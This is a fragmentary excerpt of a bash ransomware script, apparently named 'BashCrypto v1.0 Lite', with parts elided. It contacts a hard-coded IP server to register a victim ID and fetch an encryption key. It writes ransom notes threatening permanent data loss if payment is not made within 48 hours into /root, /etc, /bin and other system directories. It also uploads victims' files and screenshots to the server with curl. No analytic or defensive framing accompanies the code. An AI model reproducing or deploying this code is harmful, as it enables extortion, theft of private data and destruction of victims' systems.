...
curl -k -d "uniqueID=${genKey}" https://52.205.38.113/target.php &>/dev/null
...
curl -k "https://52.205.38.113/downloads/${genKey}_pub.pem" > /root/pub.pem
...
curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://52.205.38.113/count.php

for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
do
  {
    echo "Your files have been encrypted using RSA-4096. This occured by generating a private and public key pair on our servers. The public key was used to encrypt the files on your system. To decrypt your files, visit https://52.205.38.113/decrypt.php and the id ${genKey}. If no payment is received in the next 48 hours, the corresponding private key will be deleted and your data lost forever."
  } >> "${directory}/INSTRUCTIONS.txt"

  curl -k https://52.205.38.113/downloads/INSTRUCTIONS.html >> "${directory}/INSTRUCTIONS.html"
done
...
do
  tar czf - "${file}" |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=$(basename "${file}").tar.gz" -F "uploadFile=Upload" https://52.205.38.113/upload.php
done
...
then
  {
    ...
    echo -e "\n"
    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"unique_id=\${genKey}\" -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://52.205.38.113/upload.php"
